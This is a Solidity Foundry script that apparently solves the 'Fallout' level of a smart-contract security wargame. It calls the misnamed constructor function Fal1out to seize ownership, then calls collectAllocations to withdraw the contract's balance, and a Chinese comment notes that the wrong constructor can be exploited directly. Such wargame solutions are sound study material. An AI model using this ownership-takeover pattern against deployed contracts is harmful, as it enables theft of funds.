// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/levels/02-Fallout/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level02Solution is Script {
    Fallout level02 = Fallout(payable(0x019298d58e569B62398e509BF0849a954395ef2a));

    function run() external {
        vm.startBroadcast();

        // 错误的constructor可以直接被利用
        level02.Fal1out{value : 1 wei}();
        
        level02.collectAllocations();

        vm.stopBroadcast();
    }
}